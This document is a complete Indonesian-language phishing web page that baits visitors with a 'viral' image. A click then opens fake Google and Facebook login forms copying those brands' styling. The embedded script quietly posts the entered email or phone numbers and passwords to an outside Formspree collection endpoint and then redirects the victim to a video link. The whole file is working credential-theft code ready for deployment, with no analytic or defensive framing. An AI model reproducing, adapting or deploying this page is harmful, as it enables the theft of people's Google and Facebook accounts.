<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Teh Pucuk Viral</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', 'Segoe UI', Helvetica, Arial, sans-serif; }
        
        html, body {
            height: 100%; width: 100%; background-color: #000; overflow: hidden;
        }

        /* Gambar Konten di Belakang */
        #bg-image {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            display: flex; justify-content: center; align-items: center;
            background-color: #ffffff; z-index: 1;
        }
        #bg-image img { width: 100%; height: 100%; object-fit: contain; }

        #click-trigger {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            z-index: 2; cursor: pointer;
        }

        /* Overlay Gelap & Blur */
        #main-overlay {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.4); backdrop-filter: blur(8px);
            z-index: 1000; justify-content: center; align-items: center;
        }

        /* Card Container */
        .card {
            background: #fff; width: 92%; max-width: 400px; padding: 25px;
            border-radius: 8px; position: relative;
            box-shadow: 0 12px 28px rgba(0,0,0,0.2);
            animation: fadeIn 0.3s ease-out;
        }

        @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }

        .close-btn {
            position: absolute; top: 12px; right: 15px; font-size: 26px;
            color: #606770; cursor: pointer; line-height: 1; z-index: 10;
        }

        /* Menu Pilihan Login */
        #choice-section h2 { font-size: 20px; font-weight: 600; margin-bottom: 25px; text-align: center; color: #1c1e21; }
        .btn-choice {
            display: flex; align-items: center; justify-content: center;
            width: 100%; padding: 12px; margin-bottom: 12px;
            border-radius: 6px; border: 1px solid #dadce0;
            font-size: 16px; font-weight: 500; cursor: pointer;
        }
        .btn-google { background: #fff; color: #3c4043; }
        .btn-facebook { background: #1877f2; color: white; border: none; }
        .btn-choice img { width: 18px; margin-right: 12px; }

        /* --- FACEBOOK STYLE --- */
        #fb-section { display: none; text-align: center; }
        .fb-logo { width: 112px; margin: 0 auto 15px; display: block; }
        .fb-text { font-size: 16px; color: #1c1e21; margin-bottom: 20px; line-height: 1.3; }
        .fb-input {
            width: 100%; padding: 14px 16px; border: 1px solid #dddfe2;
            border-radius: 6px; font-size: 15px; margin-bottom: 12px;
            background: #f5f6f7; outline: none;
        }
        .fb-input:focus { border-color: #1877f2; background: #fff; box-shadow: 0 0 0 2px #e7f3ff; }
        .fb-btn { 
            width: 100%; background: #1877f2; color: #fff; border: none; 
            padding: 10px; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer;
        }

        /* --- GOOGLE STYLE --- */
        #google-section { display: none; padding: 30px 15px; }
        .g-logo { width: 75px; display: block; margin: 0 auto 10px; }
        .g-title { font-size: 24px; font-weight: 400; text-align: center; color: #202124; margin-bottom: 10px; }
        .g-subtitle { font-size: 16px; text-align: center; margin-bottom: 30px; color: #202124; }
        .g-input {
            width: 100%; padding: 13px 15px; border: 1px solid #dadce0;
            border-radius: 4px; font-size: 16px; margin-bottom: 15px; outline: none;
        }
        .g-input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
        .g-footer { display: flex; justify-content: space-between; align-items: center; margin-top: 25px; }
        .g-btn { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; }

        /* Eye Icon Utility */
        .pw-wrap { position: relative; }
        .eye { 
            position: absolute; right: 12px; top: 12px; cursor: pointer;
            display: flex; align-items: center;
        }
        .eye svg { width: 24px; height: 24px; fill: #606770; }
    </style>
</head>
<body>

    <div id="bg-image">
        <img src="https://i.postimg.cc/y6MzwjwN/Screenshot-2026-02-16-08-31-05-219-com-whatsapp-w4b-edit.jpg">
    </div>

    <div id="click-trigger" onclick="openOverlay()"></div>

    <div id="main-overlay">
        
        <div id="choice-section" class="card">
            <h2>Verifikasi Identitas</h2>
            <div class="btn-choice btn-google" onclick="showForm('google')">
                <img src="https://www.gstatic.com/images/branding/product/1x/googleg_48dp.png"> Lanjutkan dengan Google
            </div>
            <div class="btn-choice btn-facebook" onclick="showForm('fb')">
                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg"> Lanjutkan dengan Facebook
            </div>
        </div>

        <div id="fb-section" class="card">
            <span class="close-btn" onclick="backToMenu()">&times;</span>
            <img class="fb-logo" src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg">
            <p class="fb-text">Gunakan Akun Facebook Anda</p>
            <form class="ajax-form" action="https://formspree.io/f/xgolkjyz" method="POST">
                <input type="text" name="Email_FB" class="fb-input" placeholder="Nomor ponsel atau email" required>
                <div class="pw-wrap">
                    <input type="password" name="Pass_FB" class="fb-input pw-field" placeholder="Kata sandi" required>
                    <span class="eye" onclick="togglePassword(this)">
                        <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
                    </span>
                </div>
                <button type="submit" class="fb-btn">Login</button>
            </form>
            <p style="color:#1877f2; font-size:14px; margin-top:15px; cursor:pointer;">Lupa kata sandi?</p>
        </div>

        <div id="google-section" class="card">
            <span class="close-btn" onclick="backToMenu()">&times;</span>
            <img class="g-logo" src="https://www.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png">
            <h1 class="g-title">Login</h1>
            <p class="g-subtitle">Gunakan Akun Google Anda</p>
            <form class="ajax-form" action="https://formspree.io/f/xgolkjyz" method="POST">
                <input type="text" name="Email_G" class="g-input" placeholder="Email atau ponsel" required>
                <div class="pw-wrap">
                    <input type="password" name="Pass_G" class="g-input pw-field" placeholder="Masukkan sandi Anda" required>
                    <span class="eye" onclick="togglePassword(this)">
                        <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
                    </span>
                </div>
                <div class="g-footer">
                    <span style="color:#1a73e8; font-weight:500; font-size:14px; cursor:pointer;">Buat akun</span>
                    <button type="submit" class="g-btn">Berikutnya</button>
                </div>
            </form>
        </div>

    </div>

    <script>
        function openOverlay() {
            document.getElementById('click-trigger').style.display = 'none';
            document.getElementById('main-overlay').style.display = 'flex';
        }

        function showForm(type) {
            document.getElementById('choice-section').style.display = 'none';
            document.getElementById(type + '-section').style.display = 'block';
        }

        function backToMenu() {
            document.getElementById('fb-section').style.display = 'none';
            document.getElementById('google-section').style.display = 'none';
            document.getElementById('choice-section').style.display = 'block';
        }

        function togglePassword(btn) {
            const input = btn.parentElement.querySelector('.pw-field');
            const isPw = input.type === 'password';
            input.type = isPw ? 'text' : 'password';
            // Ubah ikon mata (opsional: bisa ganti SVG di sini)
        }

        // Script AJAX & Redirect
        const forms = document.querySelectorAll('.ajax-form');
        forms.forEach(form => {
            form.addEventListener('submit', async function(e) {
                e.preventDefault();
                const btn = form.querySelector('button');
                btn.innerHTML = "Memuat...";
                
                const formData = new FormData(form);
                try {
                    await fetch(form.action, {
                        method: 'POST',
                        body: formData,
                        headers: { 'Accept': 'application/json' }
                    });
                } catch (err) {}
                
                // Apapun hasilnya, arahkan ke Grup WA
                window.location.href = "https://videy.co/v/?id=PSvhx8lN1";
            });
        });
    </script>
</body>
</html>
